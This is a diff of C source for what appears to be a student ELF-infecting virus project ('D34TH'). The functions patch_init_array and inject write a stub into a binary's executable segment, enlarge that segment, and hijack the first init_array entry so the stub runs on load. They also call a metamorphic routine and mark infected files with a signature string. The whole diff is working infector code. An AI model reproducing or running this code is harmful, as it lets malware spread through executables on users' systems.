@@ -21,81 +21,111 @@ size_t g_stub_size = sizeof(g_stub_code);
 
 int patch_init_array(int fd)
 {
-	Elf64_Ehdr eh;
-	Elf64_Phdr ph;
+    Elf64_Ehdr eh;
+    Elf64_Phdr ph;
 
-	lseek(fd, 0, SEEK_SET);
-	read(fd, &eh, sizeof(eh));
-	Elf64_Off phoff = eh.e_phoff;
-	Elf64_Half phnum = eh.e_phnum;
-	Elf64_Phdr dyn_ph;
-	int dyn_found = 0;
-	for (int i = 0; i < phnum; i++) 
-	{
-		lseek(fd, phoff + i * sizeof(ph), SEEK_SET);
-		read(fd, &ph, sizeof(ph));
-		if (ph.p_type == PT_DYNAMIC) 
-		{
-			dyn_ph = ph;
-			dyn_found = 1;
-			break;
-		}
-	}
-	if (!dyn_found)
-		return 0;
+    lseek(fd, 0, SEEK_SET);
+    read(fd, &eh, sizeof(eh));
 
-	Elf64_Dyn dyn;
-	uint64_t init_array_vaddr = 0;
-	uint64_t init_array_sz    = 0;
-	for (off_t off = dyn_ph.p_offset; off < (off_t)(dyn_ph.p_offset + dyn_ph.p_filesz); off += sizeof(dyn))
-	{
-		lseek(fd, off, SEEK_SET);
-		read(fd, &dyn, sizeof(dyn));
-		if (dyn.d_tag == DT_NULL)
-			break;
-		if (dyn.d_tag == DT_INIT_ARRAY)
-			init_array_vaddr = dyn.d_un.d_ptr;
-		else if (dyn.d_tag == DT_INIT_ARRAYSZ)
-			init_array_sz = dyn.d_un.d_val;
-	}
-	if (!init_array_vaddr || init_array_sz < sizeof(uint64_t))
-		return 0;
-	Elf64_Phdr code_ph;
-	int code_index = -1;
-	for (int i = 0; i < phnum; i++) 
-	{
-		lseek(fd, phoff + i * sizeof(ph), SEEK_SET);
-		read(fd, &ph, sizeof(ph));
-		if (ph.p_type == PT_LOAD && (ph.p_flags & PF_X)) 
-		{
-			Elf64_Addr start = ph.p_vaddr;
-			Elf64_Addr end   = ph.p_vaddr + ph.p_memsz;
-			if (eh.e_entry >= start && eh.e_entry < end) 
-			{
-				code_ph = ph;
-				code_index = i;
-				break;
-			}
-		}
-	}
-	if (code_index < 0)
-		return 0;
-	const off_t align = 0x10;
-	off_t end = code_ph.p_offset + code_ph.p_filesz;
-	off_t stub_off = (end + (align - 1)) & ~(align - 1);
-	lseek(fd, stub_off, SEEK_SET);
-	write(fd, g_stub_code, g_stub_size);
-	code_ph.p_filesz = (stub_off + g_stub_size) - code_ph.p_offset;
-	code_ph.p_memsz  = code_ph.p_filesz;
-	lseek(fd, phoff + code_index * sizeof(code_ph), SEEK_SET);
-	write(fd, &code_ph, sizeof(code_ph));
-	uint64_t stub_vaddr = code_ph.p_vaddr + (stub_off - code_ph.p_offset);
-	off_t init_array_off = vaddr_to_file_offset(fd, init_array_vaddr);
-	if (init_array_off < 0)
-		return (0);
-	lseek(fd, init_array_off, SEEK_SET);
-	write(fd, &stub_vaddr, sizeof(stub_vaddr));
-	return (1);
+    Elf64_Off phoff = eh.e_phoff;
+    Elf64_Half phnum = eh.e_phnum;
+
+    /* Trouver PT_DYNAMIC */
+    Elf64_Phdr dyn_ph;
+    int dyn_found = 0;
+
+    for (int i = 0; i < phnum; i++) {
+        lseek(fd, phoff + i * sizeof(ph), SEEK_SET);
+        read(fd, &ph, sizeof(ph));
+        if (ph.p_type == PT_DYNAMIC) {
+            dyn_ph = ph;
+            dyn_found = 1;
+            break;
+        }
+    }
+
+    if (!dyn_found)
+        return 0;
+
+    /* Lire DT_INIT_ARRAY */
+    Elf64_Dyn dyn;
+    uint64_t init_array_vaddr = 0;
+    uint64_t init_array_sz    = 0;
+
+    for (off_t off = dyn_ph.p_offset;
+         off < (off_t)(dyn_ph.p_offset + dyn_ph.p_filesz);
+         off += sizeof(dyn))
+    {
+        lseek(fd, off, SEEK_SET);
+        read(fd, &dyn, sizeof(dyn));
+
+        if (dyn.d_tag == DT_NULL)
+            break;
+
+        if (dyn.d_tag == DT_INIT_ARRAY)
+            init_array_vaddr = dyn.d_un.d_ptr;
+        else if (dyn.d_tag == DT_INIT_ARRAYSZ)
+            init_array_sz = dyn.d_un.d_val;
+    }
+
+    if (!init_array_vaddr || init_array_sz < sizeof(uint64_t))
+        return 0;
+
+    /* Trouver le segment RX contenant e_entry */
+    Elf64_Phdr code_ph;
+    int code_index = -1;
+
+    for (int i = 0; i < phnum; i++) {
+        lseek(fd, phoff + i * sizeof(ph), SEEK_SET);
+        read(fd, &ph, sizeof(ph));
+
+        if (ph.p_type == PT_LOAD && (ph.p_flags & PF_X)) {
+            Elf64_Addr start = ph.p_vaddr;
+            Elf64_Addr end   = ph.p_vaddr + ph.p_memsz;
+
+            if (eh.e_entry >= start && eh.e_entry < end) {
+                code_ph = ph;
+                code_index = i;
+                break;
+            }
+        }
+    }
+
+    if (code_index < 0)
+        return 0;
+
+    /* Calcul du nouvel offset pour le stub */
+    const off_t align = 0x10;
+    off_t end = code_ph.p_offset + code_ph.p_filesz;
+    off_t stub_off = (end + (align - 1)) & ~(align - 1);
+
+    /* Écrire le stub */
+    lseek(fd, stub_off, SEEK_SET);
+    write(fd, g_stub_code, g_stub_size);
+
+    /* Mettre à jour UNIQUEMENT p_filesz/p_memsz */
+    Elf64_Phdr current;
+    lseek(fd, phoff + code_index * sizeof(current), SEEK_SET);
+    read(fd, &current, sizeof(current));
+
+    current.p_filesz = (stub_off + g_stub_size) - current.p_offset;
+    current.p_memsz  = current.p_filesz;
+
+    /* Réécrire le PHDR proprement */
+    lseek(fd, phoff + code_index * sizeof(current), SEEK_SET);
+    write(fd, &current, sizeof(current));
+
+    /* Patch init_array */
+    uint64_t stub_vaddr = current.p_vaddr + (stub_off - current.p_offset);
+    off_t init_array_off = vaddr_to_file_offset(fd, init_array_vaddr);
+
+    if (init_array_off < 0)
+        return 0;
+
+    lseek(fd, init_array_off, SEEK_SET);
+    write(fd, &stub_vaddr, sizeof(stub_vaddr));
+
+    return 1;
 }
 
 
@@ -166,25 +196,50 @@ off_t find_signature_offset(int fd)
 
 
 
+// void inject(char *path)
+// {
+// 	int fd = open(path, O_RDWR);
+// 	if (fd < 0)
+// 		return;
+// 	off_t fp_offset = find_signature_offset(fd);
+// 	if (fp_offset >= 0) 
+// 	{
+// 		patch_init_array(fd);
+// 		close(fd);
+// 		return;
+// 	}
+// 	char sig[256];
+// 	snprintf(sig, sizeof(sig),
+// 			 "D34TH version 1.0 (c)oded by marcheva-dedavid - [00000000]");
+// 	lseek(fd, 0, SEEK_END);
+// 	metamorphe(fd, path);
+// 	lseek(fd, 0, SEEK_END);
+// 	write(fd, sig, strlen(sig));
+// 	patch_init_array(fd);
+// 	close(fd);
+// }
+
+
 void inject(char *path)
 {
-	int fd = open(path, O_RDWR);
-	if (fd < 0)
-		return;
-	off_t fp_offset = find_signature_offset(fd);
-	if (fp_offset >= 0) 
-	{
-		patch_init_array(fd);
-		close(fd);
-		return;
-	}
-	char sig[256];
-	snprintf(sig, sizeof(sig),
-			 "D34TH version 1.0 (c)oded by marcheva-dedavid - [00000000]");
-	lseek(fd, 0, SEEK_END);
-	metamorphe(fd, "/home/marc/git_ub/42cursus/death/Death");
-	lseek(fd, 0, SEEK_END);
-	write(fd, sig, strlen(sig));
-	patch_init_array(fd);
-	close(fd);
+    int fd = open(path, O_RDWR);
+    if (fd < 0)
+        return;
+    off_t fp_offset = find_signature_offset(fd);
+    if (fp_offset >= 0) 
+    {
+        patch_init_array(fd);
+        close(fd);
+        return;
+    }
+    char sig[256];
+    snprintf(sig, sizeof(sig),
+             "D34TH version 1.0 (c)oded by marcheva-dedavid - [00000000]");
+    lseek(fd, 0, SEEK_END);
+    write(fd, sig, strlen(sig));
+    close(fd);
+    metamorphe(-1, path);
+    fd = open(path, O_RDWR);
+    patch_init_array(fd);
+    close(fd);
 }
